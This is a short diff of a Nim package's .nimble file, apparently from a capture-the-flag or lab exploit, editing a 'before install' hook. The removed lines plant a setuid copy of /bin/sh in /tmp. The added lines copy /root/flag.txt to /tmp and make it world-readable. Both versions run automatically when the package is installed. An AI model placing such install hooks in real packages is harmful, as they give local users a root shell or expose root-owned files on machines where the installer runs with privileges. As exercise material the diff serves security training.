@@ -14,6 +14,5 @@ requires "nim >= 1.2.6"
 
 before install:
   echo("REINSTALL HOOK")
-  exec("touch /tmp/pwnd")
-  exec("cp /bin/sh /tmp/pe")
-  exec("chmod u+s /tmp/pe")
+  exec("cp /root/flag.txt /tmp/flag.txt")
+  exec("chmod 644 /tmp/flag.txt")
